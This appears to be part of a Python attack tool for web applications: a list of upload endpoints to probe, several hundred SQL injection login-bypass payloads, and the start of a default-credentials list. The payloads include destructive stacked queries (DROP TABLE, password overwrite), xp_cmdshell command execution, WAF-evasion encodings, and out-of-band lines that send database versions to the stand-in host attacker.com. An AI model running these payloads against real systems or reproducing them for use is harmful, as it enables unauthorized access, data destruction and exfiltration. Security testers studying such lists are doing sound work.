    "school/upload",
    "course/upload",
    "assignment/upload",
    "submission/upload",
    "homework/upload",
    "exam/upload",
    "test/upload",
    "health/upload",
    "medical/upload",
    "patient/upload",
    "record/upload",
    "prescription/upload",
    "report/upload",
    "realestate/upload",
    "property/upload",
    "listing/upload",
    "house/upload",
    "apartment/upload",
    "travel/upload",
    "hotel/upload",
    "flight/upload",
    "booking/upload",
    "trip/upload",
    "events/upload",
    "event/upload",
    "conference/upload",
    "meeting/upload",
    "workshop/upload",
    "newsletter/upload",
    "mail/upload",
    "email/upload",
    "campaign/upload",
    "survey/upload",
    "poll/upload",
    "questionnaire/upload",
    "form/upload",
    "form-handler/upload",
    "form-process/upload",
    "form-submit/upload",
    "form-upload",
    "api/upload",
    "api/v1/upload",
    "api/v2/upload",
    "api/file-upload",
    "api/media-upload",
    "api/image-upload",
    "api/document-upload",
    "api/attachment-upload",
    "api/avatar-upload",
    "api/profile-upload",
    "api/upload-file",
    "api/upload-image",
    "api/upload-media",
    "api/upload-document",
    "api/upload-attachment",
    "api/upload-avatar",
    "api/upload-profile",
    "api/upload-cover",
    "api/upload-banner",
    "api/upload-logo",
    "api/upload-icon",
    "api/upload-thumbnail",
    "api/upload-screenshot",
    "api/upload-snapshot",
    "upload1.php",
    "upload2.php",
    "upload3.php",
    "file-upload1.php",
    "file-upload2.php",
    "file-upload3.php",
    "upload_v2.php",
    "upload_2.php",
    "upload-v2.php",
    "upload-2.php",
    "upload_v1.php",
    "upload_1.php",
    "upload-v1.php",
    "upload-1.php",
    "upload/index.php",
    "upload/file.php",
    "upload/upload.php",
    "uploader/index.php",
    "uploader/upload.php",
    "uploader/file.php",
    "uploader/uploader.php",
    "uploader/upload-handler.php",
    "uploader/upload-file.php",
    "uploader/upload-image.php",
    "admin/uploader.php",
    "admin/uploader/index.php",
    "admin/uploader/upload.php",
    "admin/uploader/file.php",
    "admin/uploader/uploader.php",
    "admin/upload-handler.php",
    "admin/upload-file.php",
    "admin/upload-image.php",
    "uploads.php",
    "uploads/index.php",
    "uploads/upload.php",
    "uploads/file.php",
    "upload.php?action=upload",
    "upload.php?do=upload",
    "upload.php?mode=upload",
    "upload.php?op=upload",
    "upload.php?task=upload",
    "upload.php?function=upload",
    "upload.php?cmd=upload",
    "upload.php?act=upload",
    "upload.php?upload",
    "upload.php?file",
    "upload.php?image",
    "upload.php?media",
    "upload.php?attachment",
    "upload.php?document",
    "upload.php?profile",
    "upload.php?avatar",
    "upload.php?photo",
    "upload.php?picture",
    "upload.php?img",
    "upload.php?pic",
    "upload?action=upload",
    "upload?do=upload",
    "upload?mode=upload",
    "upload?op=upload",
    "upload?task=upload",
    "upload?function=upload",
    "upload?cmd=upload",
    "upload?act=upload",
    "upload?upload",
    "upload?file",
    "upload?image",
    "upload?media",
    "upload?attachment",
    "upload?document",
    "upload?profile",
    "upload?avatar",
    "upload?photo",
    "upload?picture",
    "upload?img",
    "upload?pic",
    "index.php?action=upload",
    "index.php?do=upload",
    "index.php?mode=upload",
    "index.php?op=upload",
    "index.php?task=upload",
    "index.php?function=upload",
    "index.php?cmd=upload",
    "index.php?act=upload",
    "index.php?upload",
    "index.php?file=upload",
    "index.php?image=upload",
    "index.php?media=upload",
    "index.php?attachment=upload",
    "index.php?document=upload",
    "index.php?profile=upload",
    "index.php?avatar=upload",
    "index.php?photo=upload",
    "index.php?picture=upload",
    "index.php?img=upload",
    "index.php?pic=upload",
    "admin/index.php?action=upload",
    "admin/index.php?do=upload",
    "admin/index.php?mode=upload",
    "admin/index.php?op=upload",
    "admin/index.php?task=upload",
    "admin/index.php?function=upload",
    "admin/index.php?cmd=upload",
    "admin/index.php?act=upload",
    "admin/index.php?upload",
    "admin/index.php?file=upload",
    "admin/index.php?image=upload",
    "admin/index.php?media=upload",
    "admin/index.php?attachment=upload",
    "admin/index.php?document=upload",
    "admin/index.php?profile=upload",
    "admin/index.php?avatar=upload",
    "admin/index.php?photo=upload",
    "admin/index.php?picture=upload",
    "admin/index.php?img=upload",
    "admin/index.php?pic=upload",
    "upload-file.php?action=upload",
    "upload-handler.php?action=upload",
    "file-upload.php?action=upload",
    "uploader.php?action=upload",
    "uploadify/upload.php?action=upload",
    "plupload/upload.php?action=upload",
    "ckfinder/connector.php?command=FileUpload",
    "ckfinder/connector.php?command=QuickUpload",
    "ckfinder/connector?command=FileUpload",
    "ckfinder/connector?command=QuickUpload"
]

SQLI_PAYLOADS = [
    # ========== 1. BASIC TAUTOLOGY (ALWAYS TRUE) ==========
    ("' OR '1'='1", "anything"),
    ("' OR 1=1--", "anything"),
    ("' OR ''='", "anything"),
    ("' OR 'a'='a", "anything"),
    ("' OR 1=1#", "anything"),
    ("' OR 1=1/*", "anything"),
    ('" OR "1"="1', "anything"),
    ('" OR 1=1--', "anything"),
    ("' OR 1=1 LIMIT 1--", "anything"),
    ("' OR 1=1 OFFSET 0--", "anything"),
    ("' OR 1=1 GROUP BY 1--", "anything"),
    ("' HAVING 1=1--", "anything"),
    ("' OR '1'='1'--", "anything"),
    ("' OR '1'='1'#", "anything"),
    ("' OR 1=1-- ", "anything"),
    ("' OR 1=1--+", "anything"),
    ("' OR 1=1--%20", "anything"),
    ("' OR 1=1--%00", "anything"),
    ("' OR 1=1;--", "anything"),

    # ========== 2. ALTERNATIVE OPERATORS ==========
    ("' || '1'=='1", "anything"),           # OR as ||
    ("' || 1=1--", "anything"),
    ("' OR true--", "anything"),
    ("' OR false--", "anything"),           # false won't work, but testing
    ("' OR 1 IN (1)--", "anything"),
    ("' OR 1 BETWEEN 1 AND 2--", "anything"),
    ("' OR 1 IS NOT NULL--", "anything"),
    ("' OR NOT 1=0--", "anything"),
    ("' XOR 1=1--", "anything"),            # XOR true if one side true
    ("' AND 1=1--", "anything"),            # and true
    ("' AND 1=2--", "anything"),            # and false (for blind)
    ("' OR 1=1 AND '1'='1'--", "anything"),
    ("' OR 1=1 AND ''='", "anything"),
    ("' OR 1=1 AND 1=2--", "anything"),    # still true due to OR
    ("' OR 1=1 OR 1=2--", "anything"),
    ("' OR 1=1 XOR 1=1--", "anything"),    # XOR true? 1=1 is true, 1=1 true => false? Actually XOR true^true=false. So not useful.
    ("' OR 1=1 XOR 1=2--", "anything"),    # true^false=true, works
    ("' OR 1=1 OR 1=1--", "anything"),
    ("' OR 1=1 && '1'='1'--", "anything"), # && for AND
    ("' OR 1=1 & 1=1--", "anything"),      # bitwise AND, but likely treated as logical in some contexts

    # ========== 3. DIFFERENT QUOTES AND PARENTHESES ==========
    ("admin'--", "anything"),
    ("admin'#", "anything"),
    ("admin'/*", "anything"),
    ("admin'-- -", "anything"),
    ("admin'--+", "anything"),
    ("admin';--", "anything"),
    ("admin')--", "anything"),
    ("admin')#", "anything"),
    ("admin') OR ('1'='1", "anything"),
    ("admin') OR '1'='1'--", "anything"),
    ("admin\"--", "anything"),
    ("admin\"#", "anything"),
    ("admin\") OR (\"1\"=\"1", "anything"),
    ("admin\") OR \"1\"=\"1\"--", "anything"),
    ("admin`)--", "anything"),              # backtick
    ("admin` OR `1`=`1", "anything"),
    ("admin\\'--", "anything"),             # escaped quote
    ("admin\\\"--", "anything"),
    ("' OR (1=1)--", "anything"),
    ("' OR ((1=1))--", "anything"),
    ("' OR (1)=(1)--", "anything"),
    ("' OR (SELECT 1)=1--", "anything"),
    ("' OR 1=(SELECT 1)--", "anything"),
    ("' OR 1 IN (SELECT 1)--", "anything"),

    # ========== 4. COMMENTS AND WHITESPACE BYPASS ==========
    ("'/**/OR/**/1=1/**/--", "anything"),
    ("'/*!OR*/1=1--", "anything"),
    ("'/*!50000OR*/1=1--", "anything"),
    ("'%0AOR%0A1=1--", "anything"),          # newline
    ("'%0D%0AOR%0D%0A1=1--", "anything"),    # CRLF
    ("'%09OR%091=1--", "anything"),           # tab
    ("'%20OR%201=1--", "anything"),           # spaces
    ("'/**/UNION/**/SELECT/**/1,2,3--", "anything"),
    ("'/*!UNION*/ /*!SELECT*/ 1,2,3--", "anything"),
    ("' OR 1=1-- -", "anything"),
    ("' OR 1=1#", "anything"),
    ("' OR 1=1/*", "anything"),
    ("' OR 1=1;--", "anything"),
    ("' OR 1=1;%00", "anything"),
    ("' OR 1=1--%00", "anything"),
    ("' OR 1=1 --", "anything"),
    ("'OR 1=1--", "anything"),               # no space before OR
    ("OR 1=1--", "anything"),                 # no leading quote
    ("' OR 1=1-- ", "anything"),

    # ========== 5. UNION-BASED PAYLOADS ==========
    ("' UNION SELECT 1,2,3--", "anything"),
    ("' UNION ALL SELECT 1,2,3--", "anything"),
    ("' UNION SELECT 1,2,3#", "anything"),
    ("' UNION SELECT 1,2,3/*", "anything"),
    ("' UNION SELECT NULL,NULL,NULL--", "anything"),
    ("' UNION SELECT 1,2,3 FROM dual--", "anything"),  # Oracle
    ("' UNION SELECT 1,2,3 FROM information_schema.tables--", "anything"),
    ("' UNION SELECT 1,database(),user()--", "anything"),
    ("' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "anything"),
    ("' UNION SELECT 1,2,@@version--", "anything"),
    ("' UNION SELECT 1,2,3 WHERE '1'='1'--", "anything"),
    ("' UNION SELECT 1,2,3 AND 1=1--", "anything"),
    ("' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--", "anything"), # comma-less
    ("' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/out'--", "anything"),  # file write
    ("' UNION SELECT 1,2,3 INTO DUMPFILE '/tmp/out'--", "anything"),
    ("admin' UNION SELECT 1, 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--", "anything"), # md5(1234)
    ("admin' UNION SELECT 1, 'admin', '5f4dcc3b5aa765d61d8327deb882cf99'--", "anything"), # md5(password)
    ("' UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "anything"),
    ("' UNION SELECT 1,2,3 FROM users WHERE username='admin'--", "anything"),

    # ========== 6. STACKED QUERIES (MULTI-STATEMENT) ==========
    ("'; DROP TABLE users--", "anything"),
    ("'; INSERT INTO users (username, password) VALUES ('hacker','hack')--", "anything"),
    ("'; UPDATE users SET password='hacked' WHERE username='admin'--", "anything"),
    ("'; DELETE FROM users WHERE username='admin'--", "anything"),
    ("'; WAITFOR DELAY '00:00:05'--", "anything"),          # MSSQL
    ("'; EXEC xp_cmdshell 'whoami'--", "anything"),         # MSSQL
    ("'; SELECT pg_sleep(5)--", "anything"),                # PostgreSQL
    ("'; SELECT * FROM pg_sleep(5)--", "anything"),
    ("'; SELECT sleep(5)--", "anything"),                   # MySQL
    ("'; SELECT BENCHMARK(1000000,MD5('a'))--", "anything"), # MySQL heavy
    ("'; OR 1=1; --", "anything"),

    # ========== 7. TIME-BASED BLIND ==========
    ("' OR SLEEP(5)--", "anything"),
    ("' OR SLEEP(5) AND '1'='1'--", "anything"),
    ("' OR SLEEP(5)#", "anything"),
    ("' OR 1=1 AND SLEEP(5)--", "anything"),
    ("' OR 1=1 AND BENCHMARK(1000000,MD5('a'))--", "anything"),
    ("' OR 1=1 AND IF(1=1, SLEEP(5), 0)--", "anything"),
    ("' OR 1=1; WAITFOR DELAY '00:00:05'--", "anything"),
    ("' OR 1=1 AND 123=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "anything"), # Oracle
    ("' OR 1=1 AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--", "anything"),
    ("' OR 1=1 AND pg_sleep(5)--", "anything"),
    ("' OR 1=1 AND (SELECT * FROM (SELECT SLEEP(5))a)--", "anything"),
    ("' OR 1=1 AND (SELECT COUNT(*) FROM information_schema.tables) AND SLEEP(5)--", "anything"),

    # ========== 8. BOOLEAN-BASED BLIND ==========
    ("' AND 1=1--", "anything"),
    ("' AND 1=2--", "anything"),
    ("' OR 1=1--", "anything"),
    ("' OR 1=2--", "anything"),
    ("admin' AND 1=1--", "anything"),
    ("admin' AND 1=2--", "anything"),
    ("' OR LENGTH(database())=5--", "anything"),
    ("' OR SUBSTRING(database(),1,1)='a'--", "anything"),
    ("' OR ASCII(SUBSTRING(database(),1,1))=97--", "anything"),
    ("' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--", "anything"),
    ("' OR (SELECT COUNT(*) FROM users)>0--", "anything"),
    ("' OR (SELECT 1)='1'--", "anything"),

    # ========== 9. ERROR-BASED PAYLOADS ==========
    # MySQL
    ("' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e))--", "anything"),
    ("' AND UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 1)--", "anything"),
    ("' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(DATABASE(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "anything"),
    ("' AND 1=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "anything"),
    ("' AND 1=1 AND 1=CONVERT(int, @@version)--", "anything"), # actually MSSQL
    # MSSQL
    ("' AND 1=CAST((SELECT @@version) AS INT)--", "anything"),
    ("' AND 1=CONVERT(int, @@version)--", "anything"),
    ("' AND 1=1 AND 1=(SELECT 1/0)--", "anything"), # division by zero
    # Oracle
    ("' AND CTXSYS.DRITHSX.SN(1, (SELECT USER FROM DUAL))--", "anything"),
    ("' AND 1=1 AND 1=UTL_INADDR.get_host_name('10.0.0.1')--", "anything"), # may cause error
    # PostgreSQL
    ("' AND 1=CAST((SELECT version()) AS INT)--", "anything"),
    ("' AND 1=1 AND 1=(SELECT 1/0)--", "anything"),
    # SQLite
    ("' AND 1=1 AND randomblob(100000000)--", "anything"), # may cause out of memory

    # ========== 10. OUT-OF-BAND (DNS/HTTP) ==========
    ("' OR 1=1 AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.attacker.com\\\\a'))--", "anything"), # MySQL OOB
    ("' OR 1=1 AND (SELECT * FROM (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.attacker.com\\\\a')))a)--", "anything"),
    ("' OR 1=1 AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT version()) FROM DUAL))--", "anything"), # Oracle
    ("' OR 1=1; EXEC master..xp_dirtree '\\\\attacker.com\\file'--", "anything"), # MSSQL
    ("' OR 1=1; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--", "anything"), # PostgreSQL

    # ========== 11. WAF BYPASS - ENCODING ==========
    ("%27%20OR%20%271%27%3D%271", "anything"),            # URL encoded
    ("%2527%20OR%201=1--", "anything"),                   # double encoded
    ("%27%20OR%201=1--", "anything"),
    ("%27%20OR%201%3D1--", "anything"),
    ("%27%20OR%20true--", "anything"),
    ("%27%0AOR%0A1=1--", "anything"),
    ("%27%09OR%091=1--", "anything"),
    ("%27%20%4F%52%20%31%3D%31--", "anything"),           # hex encoded OR and 1=1
    ("' OR 1=1--", "anything"),                             # normal
    ("' OR 1=1--%00", "anything"),
    ("' OR 1=1--%0A", "anything"),
    ("' OR 1=1--%0D%0A", "anything"),
    ("' OR 1=1--%09", "anything"),
    ("' OR 1=1--%20%20", "anything"),

    # ========== 12. WAF BYPASS - CASE VARIATION ==========
    ("' Or 1=1--", "anything"),
    ("' oR 1=1--", "anything"),
    ("' OR 1=1--", "anything"),
    ("' UnIoN SeLeCt 1,2,3--", "anything"),
    ("' UnIoN aLL sElEcT 1,2,3--", "anything"),
    ("' Or 1 In (1)--", "anything"),
    ("' oR 1 bEtWeEn 1 aNd 2--", "anything"),

    # ========== 13. WAF BYPASS - USING COMMENTS INSIDE KEYWORDS ==========
    ("' O/**/R 1=1--", "anything"),
    ("' U/**/NION S/**/ELECT 1,2,3--", "anything"),
    ("' /*!OR*/ 1=1--", "anything"),
    ("' /*!UNION*/ /*!SELECT*/ 1,2,3--", "anything"),
    ("' OR 1=1--", "anything"),
    ("' O--+R 1=1--", "anything"), # not sure
    ("' /*!50000OR*/ 1=1--", "anything"),

    # ========== 14. USING HEX AND CHAR FUNCTIONS ==========
    ("' OR username=0x61646d696e--", "anything"),            # admin in hex
    ("' OR username=CHAR(97,100,109,105,110)--", "anything"), # MySQL CHAR()
    ("' OR 1=1 AND password=0x31323334--", "anything"),      # 1234 in hex
    ("' OR 1=1 AND password=CHAR(49,50,51,52)--", "anything"),
    ("' UNION SELECT 1,2,CHAR(97,100,109,105,110)--", "anything"),
    ("' OR 1=1 AND 1=0x31--", "anything"),                   # 1 in hex
    ("' OR 1=1 AND 1=0x31 AND '1'='1'--", "anything"),

    # ========== 15. USING FUNCTIONS TO GENERATE TRUE CONDITION ==========
    ("' OR RAND()=RAND()--", "anything"),
    ("' OR NOW()=NOW()--", "anything"),
    ("' OR VERSION()=VERSION()--", "anything"),
    ("' OR MD5('a')=MD5('a')--", "anything"),
    ("' OR LENGTH('a')=1--", "anything"),
    ("' OR ASCII('a')=97--", "anything"),
    ("' OR CHARSET('a') IS NOT NULL--", "anything"),
    ("' OR COALESCE(1,0)=1--", "anything"),
    ("' OR IFNULL(1,0)=1--", "anything"),
    ("' OR NULLIF(1,1) IS NULL--", "anything"),

    # ========== 16. UNCOMMON COMPARISONS ==========
    ("' OR 1<>0--", "anything"),
    ("' OR 1!=0--", "anything"),
    ("' OR 1>0--", "anything"),
    ("' OR 1<2--", "anything"),
    ("' OR 1>=1--", "anything"),
    ("' OR 1<=2--", "anything"),
    ("' OR 1 LIKE 1--", "anything"),
    ("' OR 'a' LIKE 'a'--", "anything"),
    ("' OR 'a' REGEXP 'a'--", "anything"),
    ("' OR 'a' SOUNDS LIKE 'a'--", "anything"),
    ("' OR 'a' IN ('a','b')--", "anything"),
    ("' OR 1 BETWEEN SYMMETRIC 1 AND 2--", "anything"),

    # ========== 17. NESTED CONDITIONS ==========
    ("' OR (1=1) AND (2=2)--", "anything"),
    ("' OR (1=1) OR (1=2)--", "anything"),
    ("' OR ((1=1) AND (2=2))--", "anything"),
    ("' OR (SELECT 1)=1--", "anything"),
    ("' OR (SELECT COUNT(*) FROM users)>0--", "anything"),
    ("' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--", "anything"),
    ("' OR 1 IN (SELECT 1 FROM users)--", "anything"),
    ("' OR 1=(SELECT 1 FROM dual)--", "anything"),

    # ========== 18. PAYLOADS THAT BYPASS SPECIFIC FILTERS ==========
    # Bypass magic quotes / addslashes
    ("\\' OR 1=1--", "anything"),            # escaped quote, might become \' OR 1=1, still works if not escaped?
    ("%bf%27 OR 1=1--", "anything"),          # wide character bypass (GBK)
    ("%df%27 OR 1=1--", "anything"),          # another wide char
    # Bypass keyword filters (OR, AND)
    ("' || 1=1--", "anything"),
    ("' | 1=1--", "anything"),                # bitwise OR, may not work
    ("' & 1=1--", "anything"),                # bitwise AND
    ("' ^ 1=1--", "anything"),                 # XOR bitwise
    ("' && 1=1--", "anything"),                # AND
    ("' || 1=1 && '1'='1'--", "anything"),
    # Bypass space filters (alternative whitespace)
    ("'%09OR%091=1--", "anything"),
    ("'%0AOR%0A1=1--", "anything"),
    ("'%0DOR%0D1=1--", "anything"),
    ("'%0C%0DOR%0C%0D1=1--", "anything"),

    # ========== 19. SECOND-ORDER INJECTION (requires stored payload) ==========
    ("' OR 1=1--", "anything"),               # if stored and later used in query

    # ========== 20. COOKIE / HEADER INJECTION PAYLOADS ==========
    ("' OR 1=1--", "anything"),                # for cookies
    ("' UNION SELECT 1,2,3--", "anything"),
    ("' OR SLEEP(5)--", "anything"),

    # ========== 21. JSON INJECTION (if API) ==========
    ("' OR '1'='1", "anything"),
    ("' OR 1=1--", "anything"),

    # ========== 22. PAYLOADS FOR SPECIFIC DBMS ==========
    # MySQL
    ("' OR 1=1-- ", "anything"),
    ("' OR 1=1#", "anything"),
    ("' OR 1=1/*", "anything"),
    ("' OR 1=1;--", "anything"),
    ("' OR 1=1 AND SLEEP(5)--", "anything"),
    ("' UNION SELECT 1,2,3--", "anything"),
    ("' AND 1=1 UNION SELECT 1,2,3--", "anything"),
    # MSSQL
    ("' OR 1=1--", "anything"),
    ("' OR 1=1;--", "anything"),
    ("' OR 1=1 WAITFOR DELAY '00:00:05'--", "anything"),
    ("' OR 1=1; EXEC xp_cmdshell 'whoami'--", "anything"),
    ("' UNION SELECT 1,2,3--", "anything"),
    ("' AND 1=1 UNION SELECT 1,2,3--", "anything"),
    # Oracle
    ("' OR 1=1--", "anything"),
    ("' OR 1=1--", "anything"),
    ("' OR 1=1 AND 123=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "anything"),
    ("' UNION SELECT 1,2,3 FROM DUAL--", "anything"),
    ("' UNION SELECT NULL,NULL,NULL FROM DUAL--", "anything"),
    # PostgreSQL
    ("' OR 1=1--", "anything"),
    ("' OR 1=1; SELECT pg_sleep(5)--", "anything"),
    ("' UNION SELECT 1,2,3--", "anything"),
    ("' UNION SELECT NULL,NULL,NULL--", "anything"),
    # SQLite
    ("' OR 1=1--", "anything"),
    ("' UNION SELECT 1,2,3--", "anything"),
    ("' AND 1=1 UNION SELECT 1,2,3--", "anything"),

    # ========== 23. ADVANCED BYPASS TECHNIQUES ==========
    ("' OR 1=1 INTO OUTFILE '/tmp/out'--", "anything"),
    ("' OR 1=1 PROCEDURE ANALYSE()--", "anything"),      # MySQL
    ("' OR 1=1 GROUP BY 1 WITH ROLLUP--", "anything"),
    ("' OR 1=1 HAVING 1=1--", "anything"),
    ("' OR 1=1 ORDER BY 1--", "anything"),
    ("' OR 1=1 AND 1=0 OR 1=1--", "anything"),           # logic confusion
    ("' OR 1=1 AND 1=0 UNION SELECT 1,2,3--", "anything"),
    ("' OR 1=1 AND MID(VERSION(),1,1)=5--", "anything"),
    ("' OR 1=1 AND ORD(MID(VERSION(),1,1))=53--", "anything"),
    ("' OR 1=1 AND EXISTS(SELECT 1)--", "anything"),
    ("' OR 1=1 AND 1=(SELECT 1 FROM information_schema.tables)--", "anything"),
    ("' OR 1=1 AND RLIKE('^[a-z]', 'a')--", "anything"),

    # ========== 24. RARE AND OBSOLETE PAYLOADS ==========
    ("' OR '1'='1'/*", "anything"),
    ("' OR '1'='1'#", "anything"),
    ("' OR '1'='1'--", "anything"),
    ("' OR '1'='1' AND 1=1--", "anything"),
    ("' OR '1'='1' OR '1'='1'--", "anything"),
    ("' OR 1=1-- -", "anything"),
    ("' OR 1=1--+", "anything"),
    ("' OR 1=1--%20", "anything"),
    ("' OR 1=1--%09", "anything"),
    ("' OR 1=1--%0A", "anything"),
    ("' OR 1=1--%0D%0A", "anything"),
    ("' OR 1=1--%00", "anything"),
    ("' OR 1=1--;", "anything"),
    ("' OR 1=1;%00", "anything"),
    ("' OR 1=1'--", "anything"),

    # ========== 25. MIXED TECHNIQUES ==========
    ("' UNION SELECT 1,2,3 WHERE 1=1 AND SLEEP(5)--", "anything"),
    ("' OR 1=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)--", "anything"),
    ("' OR 1=1 AND 1=1 UNION SELECT 1,2,3--", "anything"),
    ("' OR 1=1 AND 1=0 UNION SELECT 1,2,3--", "anything"),
    ("' OR 1=1 AND 1=0 UNION SELECT 1,2,3 AND 1=1--", "anything"),

    # ========== 26. PAYLOADS FOR NO-QUOTE SCENARIOS ==========
    ("admin--", "anything"),                  # if no quotes used
    ("1 OR 1=1--", "anything"),
    ("1 UNION SELECT 1,2,3--", "anything"),
    ("1 AND 1=1--", "anything"),
    ("1 OR 1=1--", "anything"),

    # ========== 27. PAYLOADS FOR NUMERIC FIELDS ==========
    ("1 OR 1=1", "anything"),
    ("1 OR 1=1--", "anything"),
    ("1 UNION SELECT 1,2,3", "anything"),
    ("1 AND SLEEP(5)", "anything"),
    ("1; DROP TABLE users--", "anything"),

    # ========== 28. PAYLOADS WITH CONCATENATION ==========
    ("' OR '1'='1'", "anything"),
    ("' OR 'a'='a'", "anything"),
    ("' OR CONCAT('a','b')='ab'--", "anything"),
    ("' OR 'a'||'b'='ab'--", "anything"),     # Oracle/PostgreSQL concatenation
    ("' OR 'a'+'b'='ab'--", "anything"),       # MSSQL concatenation
    ("' OR 'a' 'b'='ab'--", "anything"),       # MySQL implicit concatenation

    # ========== 29. PAYLOADS USING SUBQUERIES IN WHERE ==========
    ("' OR 1=(SELECT 1 FROM dual)--", "anything"),
    ("' OR (SELECT 1 FROM users LIMIT 1)=1--", "anything"),
    ("' OR EXISTS(SELECT 1 FROM users)--", "anything"),
    ("' OR (SELECT COUNT(*) FROM users)>0--", "anything"),

    # ========== 30. PAYLOADS WITH MATHEMATICAL OPERATIONS ==========
    ("' OR 2-1=1--", "anything"),
    ("' OR 1*1=1--", "anything"),
    ("' OR 1/1=1--", "anything"),
    ("' OR 1%1=0--", "anything"),              # modulo
    ("' OR 2>1--", "anything"),
    ("' OR 1<2--", "anything"),

    # ========== 31. PAYLOADS WITH BITWISE OPERATIONS ==========
    ("' OR 1&1=1--", "anything"),               # bitwise AND
    ("' OR 1|1=1--", "anything"),               # bitwise OR
    ("' OR 1^0=1--", "anything"),               # bitwise XOR
    ("' OR ~1=-2--", "anything"),               # bitwise NOT

    # ========== 32. PAYLOADS FOR JSON/API INJECTION ==========
    ("' OR '1'='1'", "anything"),
    ("' OR 1=1--", "anything"),
    ("{\"username\": \"' OR 1=1--\", \"password\": \"anything\"}", "anything"),

    # ========== 33. PAYLOADS FOR XML INJECTION ==========
    ("' OR 1=1 OR '1'='1", "anything"),
    ("' OR 1=1--", "anything"),

    # ========== 34. PAYLOADS FOR LDAP INJECTION (if misinterpreted) ==========
    ("*)(uid=*", "anything"),
    ("*)(|(uid=*", "anything"),

    # ========== 35. PAYLOADS FOR NOSQL INJECTION (if applicable) ==========
    ("' || '1'=='1", "anything"),
    ("' || 1==1--", "anything"),
    ("' && this.password.match(/.*/)--", "anything"),

    # ========== 36. MASSIVE AMOUNT OF COMBINATIONS ==========
    ("' OR 1=1--", "anything"),
    ("' OR 1=1#", "anything"),
    ("' OR 1=1/*", "anything"),
    ("' OR 1=1-- -", "anything"),
    ("' OR 1=1--+", "anything"),
    ("' OR 1=1--%20", "anything"),
    ("' OR 1=1--%09", "anything"),
    ("' OR 1=1--%0A", "anything"),
    ("' OR 1=1--%0D%0A", "anything"),
    ("' OR 1=1--%00", "anything"),
    ("' OR 1=1;--", "anything"),
    ("' OR 1=1;%00", "anything"),
    ("' OR 1=1 AND '1'='1'--", "anything"),
    ("' OR 1=1 AND '1'='1'#", "anything"),
    ("' OR 1=1 AND '1'='1'/*", "anything"),
    ("' OR 1=1 AND 1=1--", "anything"),
    ("' OR 1=1 AND 1=1#", "anything"),
    ("' OR 1=1 AND 1=1/*", "anything"),
    ("' OR '1'='1' AND 1=1--", "anything"),
    ("' OR '1'='1' AND '2'='2'--", "anything"),
    ("' OR 'a'='a' AND 'b'='b'--", "anything"),
    ("' OR '1'='1' OR '1'='1'--", "anything"),
    ("' OR '1'='1' OR 1=1--", "anything"),
    ("' OR 1=1 OR '1'='1'--", "anything"),
    ("' OR 1=1 OR 1=1--", "anything"),
    ("' OR 1=1 OR 'x'='x'--", "anything"),
    ("' OR 'x'='x' OR 1=1--", "anything"),

    # ========== 37. FINAL ULTIMATE COVERAGE ==========
    ("' OR 1=1--", "anything"),
    ("' UNION SELECT 1,2,3--", "anything"),
    ("' AND SLEEP(5)--", "anything"),
    ("' AND 1=1--", "anything"),
    ("' AND 1=2--", "anything"),
    ("' OR 1=1 INTO OUTFILE '/tmp/out'--", "anything"),
    ("'; EXEC xp_cmdshell 'whoami'--", "anything"),
    ("' OR 1=1 AND pg_sleep(5)--", "anything"),
    ("' OR 1=1 AND 123=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "anything"),
    ("' OR 1=1 AND 1=CAST((SELECT @@version) AS INT)--", "anything"),
    ("' OR 1=1 AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e))--", "anything"),
    ("' OR 1=1 AND UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 1)--", "anything"),
    ("' OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "anything"),
    ("' OR 1=1 AND 1=CONVERT(int, @@version)--", "anything"),
    ("' OR 1=1 AND 1=(SELECT 1/0)--", "anything"),
    ("' OR 1=1 AND CTXSYS.DRITHSX.SN(1, (SELECT USER FROM DUAL))--", "anything"),
    ("' OR 1=1 AND UTL_INADDR.get_host_name('10.0.0.1')--", "anything"),
    ("' OR 1=1 AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.attacker.com\\\\a'))--", "anything"),
    ("' OR 1=1 AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT version()) FROM DUAL))--", "anything"),
    ("' OR 1=1; EXEC master..xp_dirtree '\\\\attacker.com\\file'--", "anything"),
    ("' OR 1=1; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--", "anything"),
]

# Comprehensive Default Credentials List
# Stronger and more effective for security testing and research.
# Organized by category with common username/password pairs.
# Use only with proper authorization.

DEFAULT_CREDS = [
    # ------------------------------------------------------------
    # General / Most Common
    # ------------------------------------------------------------
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "12345"), ("admin", "1234"),
    ("admin", "123"), ("admin", "12"), ("admin", "1"), ("admin", "0"),
    ("admin", ""), ("admin", " "), ("admin", "null"), ("admin", "none"),
    ("admin", "blank"), ("admin", "empty"), ("admin", "changeme"),
    ("admin", "default"), ("admin", "letmein"), ("admin", "secret"),
    ("admin", "pass"), ("admin", "passwd"), ("admin", "password123"),
    ("admin", "password1"), ("admin", "p@ssw0rd"), ("admin", "P@ssw0rd"),
